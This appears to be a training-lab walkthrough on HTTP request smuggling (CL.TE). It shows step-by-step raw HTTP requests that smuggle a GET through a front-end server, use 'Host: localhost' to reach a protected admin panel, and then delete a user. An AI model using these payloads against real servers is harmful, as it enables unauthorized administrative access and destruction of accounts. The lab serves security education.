Title: Exploiting HTTP request smuggling to bypass front-end security controls, CL.TE vulnerability
Level: PRACTITIONER
Desc:  This lab involves a front-end and back-end server, and the front-end server doesn't support chunked encoding. There's an admin panel at /admin, but the front-end server blocks access to it.
To solve the lab, smuggle a request to the back-end server that accesses the admin panel and deletes the user carlos
Hint: Although the lab supports HTTP/2, the intended solution requires techniques that are only possible in HTTP/1. You can manually switch protocols in Burp Repeater from the Request attributes section of the Inspector panel. 

Hint2: Manually fixing the length fields in request smuggling attacks can be tricky. Our HTTP Request Smuggler Burp extension was designed to help. You can install it via the BApp Store. 

# Walkthrough:
<img width="692" height="110" alt="image" src="https://github.com/user-attachments/assets/f63bdd26-a345-4f83-ba00-875ea4d32adf" />


<img width="521" height="217" alt="image" src="https://github.com/user-attachments/assets/e880a02d-f333-4253-a2c1-6287da479955" />
Requesting the following request twice:
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 37
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
X-Ignore: X
```
Second request says: Unauthorized
<img width="1080" height="232" alt="image" src="https://github.com/user-attachments/assets/ee4abcd3-a2ac-43cd-a91e-52b05dd3817f" />

We can see in error message (in response to first request being sent twice), that admin panel is only visible for local users. So we add : `Host: localhost`
Requesting the following request twice:
```
POST / HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 54
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
X-Ignore: X
```
Now we have another error: Duplicate header names are not allowed:
<img width="1250" height="252" alt="image" src="https://github.com/user-attachments/assets/b319f541-5d05-443c-99ad-a3257fc92f77" />

We send again, following header twice:
```
POST / HTTP/1.1
Host: 0ac200f904ed70df8195b617001b00b1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 116
Transfer-Encoding: chunked

0

GET /admin HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

x=
```

And we get to the admin panel.

Sending this request twice:
```
POST / HTTP/1.1
Host: 0ac200f904ed70df8195b617001b00b1.web-security-academy.net
Content-Type: application/x-www-form-urlencoded
Content-Length: 139
Transfer-Encoding: chunked

0

GET /admin/delete?username=carlos HTTP/1.1
Host: localhost
Content-Type: application/x-www-form-urlencoded
Content-Length: 23

x=
```
And we have carlos deleted.

